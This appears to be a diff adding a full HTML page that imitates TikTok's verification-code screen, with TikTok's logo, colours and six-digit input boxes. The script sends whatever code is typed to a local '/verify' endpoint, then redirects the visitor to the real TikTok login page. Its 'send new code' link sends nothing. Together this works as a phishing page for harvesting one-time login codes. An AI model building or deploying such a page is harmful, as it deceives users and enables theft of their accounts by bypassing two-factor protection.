@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Verification Code</title>
+    <style>
+        :root {
+            --tiktok-black: #000000;
+            --tiktok-red: #FE2C55;
+            --tiktok-red-hover: #ef1d48;
+            --background-color: #ffffff;
+            --text-color: #161823;
+            --secondary-text: #8A8B91;
+            --border-color: #E3E3E4;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 24px 16px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .tiktok-logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .tiktok-logo img {
+            width: 120px;
+            height: auto;
+        }
+
+        .verification-box {
+            background: white;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 32px 24px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        p {
+            color: var(--secondary-text);
+            margin-bottom: 24px;
+            font-size: 15px;
+            text-align: center;
+        }
+
+        .otp-container {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+            justify-content: center;
+        }
+
+        .otp-input {
+            width: 40px;
+            height: 44px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            background: #F8F8F8;
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: var(--tiktok-black);
+            background: white;
+        }
+
+        button {
+            background: var(--tiktok-red);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 14px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background: var(--tiktok-red-hover);
+        }
+
+        .resend {
+            text-align: center;
+            font-size: 14px;
+            color: var(--secondary-text);
+        }
+
+        .resend a {
+            color: var(--tiktok-black);
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .resend a:hover {
+            text-decoration: underline;
+        }
+
+        #timer {
+            color: var(--secondary-text);
+            font-size: 14px;
+        }
+
+        #combinedOTP {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="tiktok-logo">
+            <svg width="120" height="42" viewBox="0 0 120 42" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M9.87537 16.842V15.7233C9.49211 15.6721 9.10246 15.6401 8.70003 15.6401C3.90288 15.6338 0 19.5399 0 24.3475C0 27.2947 1.46917 29.9031 3.71764 31.4822C2.26763 29.9287 1.37974 27.8381 1.37974 25.5494C1.37974 20.8121 5.17403 16.9507 9.87537 16.842Z" fill="#25F4EE"/>
+                <path d="M10.0862 29.5259C12.2261 29.5259 13.9763 27.819 14.053 25.6965L14.0594 6.72822H17.5215C17.4512 6.33824 17.4129 5.93548 17.4129 5.52632H12.686L12.6796 24.4946C12.6029 26.6171 10.8527 28.324 8.71286 28.324C8.04854 28.324 7.42255 28.1578 6.86682 27.8637C7.58224 28.8674 8.75758 29.5259 10.0862 29.5259Z" fill="#25F4EE"/>
+                <path d="M23.9923 13.166V12.1112C22.6701 12.1112 21.4436 11.7212 20.4088 11.0435C21.3286 12.0984 22.5742 12.8656 23.9923 13.166Z" fill="#25F4EE"/>
+                <path d="M20.4088 11.0435C19.3995 9.88639 18.7927 8.37762 18.7927 6.72821H17.528C17.8537 8.53106 18.9269 10.0782 20.4088 11.0435Z" fill="#FE2C55"/>
+                <path d="M8.70642 20.3646C6.51544 20.3646 4.73328 22.1483 4.73328 24.3411C4.73328 25.8691 5.602 27.1988 6.86676 27.8637C6.39408 27.2116 6.11302 26.4125 6.11302 25.543C6.11302 23.3502 7.89518 21.5665 10.0862 21.5665C10.495 21.5665 10.891 21.6368 11.2615 21.7519V16.9188C10.8782 16.8676 10.4886 16.8356 10.0862 16.8356C10.0159 16.8356 9.95202 16.842 9.88175 16.842V20.55C9.50488 20.4349 9.11523 20.3646 8.70642 20.3646Z" fill="#FE2C55"/>
+                <path d="M23.9921 13.166V16.842C21.5392 16.842 19.2652 16.0557 17.4127 14.7259V24.3475C17.4127 29.1487 13.5099 33.0548 8.70631 33.0548C6.85388 33.0548 5.12921 32.4547 3.71753 31.4822C5.30806 33.1891 7.57569 34.2632 10.0861 34.2632C14.8832 34.2632 18.786 30.357 18.786 25.5558V15.9404C20.6322 17.2702 22.9062 18.0565 25.3591 18.0565V13.3831C24.8902 13.3831 24.4271 13.3058 23.9921 13.166Z" fill="#FE2C55"/>
+                <path d="M17.4127 24.3475V14.7259C19.2652 16.0557 21.5392 16.842 23.9921 16.842V13.166C22.574 12.8656 21.3284 12.0984 20.4086 11.0435C18.9266 10.0782 17.8599 8.53106 17.5213 6.72821H14.0592L14.0528 25.6964C13.9762 27.819 12.2259 29.5259 10.0861 29.5259C8.75742 29.5259 7.58847 28.8674 6.86028 27.8701C5.59551 27.1988 4.72679 25.8755 4.72679 24.3475C4.72679 22.1547 6.50895 20.371 8.69993 20.371C9.10874 20.371 9.50478 20.4413 9.87527 20.5564V16.8484C5.17393 16.9507 1.37964 20.8121 1.37964 25.5494C1.37964 27.8381 2.26753 29.9223 3.71753 31.4822C5.12921 32.4547 6.85389 33.0548 8.70632 33.0548C13.5035 33.0548 17.4127 29.1487 17.4127 24.3475Z" fill="black"/>
+                <path d="M30.0477 13.1787H44.8225L43.4683 17.411H39.6357V33.0548H34.8577V17.411L30.0541 17.411L30.0477 13.1787Z" fill="black"/>
+                <path d="M69.0317 13.1787H84.1514L82.7972 17.411H78.6261V33.0548H73.8417V17.411L69.0381 17.411L69.0317 13.1787Z" fill="black"/>
+                <path d="M45.7295 19.5015H50.4628V33.0548H45.755L45.7295 19.5015Z" fill="black"/>
+                <path d="M52.347 13.1277H57.0802V33.0548H52.347V13.1277Z" fill="black"/>
+                <path d="M63.0946 13.1277H67.8278V33.0548H63.0946V13.1277Z" fill="black"/>
+                <path d="M45.7295 13.1277H50.4628V18.4851H45.755L45.7295 13.1277Z" fill="black"/>
+                <path d="M98.591 33.0548V13.1277H109.492V17.3985H103.36V20.8311H108.801V25.1019H103.36V33.0548H98.591Z" fill="black"/>
+            </svg>
+        </div>
+        <div class="verification-box">
+            <h1>Enter verification code</h1>
+            <p>We sent a code to your email. Enter it below to verify your identity.</p>
+            
+            <form action="/verify" method="POST" id="otpForm">
+                <div class="otp-container">
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                </div>
+                <input type="hidden" id="combinedOTP" name="otp">
+                <button type="submit">Submit</button>
+            </form>
+            
+            <div class="resend">
+                <span id="timer">Resend code in: 30s</span><br>
+                <a href="#" id="resendLink" style="display: none;">Send new code</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Handle OTP input
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const combinedOTP = document.getElementById('combinedOTP');
+        const form = document.getElementById('otpForm');
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1) {
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const otp = Array.from(otpInputs).map(input => input.value).join('');
+            combinedOTP.value = otp;
+            
+            // Submit form and redirect
+            fetch('/verify', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ otp: otp })
+            })
+            .then(response => response.json())
+            .then(data => {
+                window.location.href = 'https://www.tiktok.com/login';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+
+        // Timer functionality
+        let timeLeft = 30;
+        const timerElement = document.getElementById('timer');
+        const resendLink = document.getElementById('resendLink');
+
+        const updateTimer = () => {
+            if (timeLeft > 0) {
+                timerElement.textContent = `Resend code in: ${timeLeft}s`;
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                timerElement.style.display = 'none';
+                resendLink.style.display = 'inline';
+            }
+        };
+
+        updateTimer();
+
+        resendLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            timeLeft = 30;
+            timerElement.style.display = 'inline';
+            resendLink.style.display = 'none';
+            updateTimer();
+        });
+    </script>
+</body>
+</html> 
